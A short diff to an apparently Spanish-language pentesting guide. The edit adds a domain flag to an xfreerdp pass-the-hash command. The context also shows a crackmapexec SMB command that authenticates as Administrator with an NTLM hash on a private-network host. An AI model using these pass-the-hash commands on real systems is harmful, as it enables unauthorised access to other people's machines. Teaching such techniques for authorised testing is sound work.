@@ -1512,5 +1512,5 @@ crackmapexec smb 192.168.1.45 -u 'Administrator ' -H aad3c435b514a4eeaad3b935b51
 También habría servido contra todo el rango /24. Su uso también puede ser utilizado incluso para en caso de no conocer la contraseña en claro, realizar autenticaciones vía **RDP**:
 
 ```bash
-xfreerdp /u:Administrator /pth:c46b9e588fa0d112de6f59fd6d58eae3 /v:192.168.1.5
+xfreerdp /u:Administrator /d:WORKGROUP /pth:c46b9e588fa0d112de6f59fd6d58eae3 /v:192.168.1.5
 ```
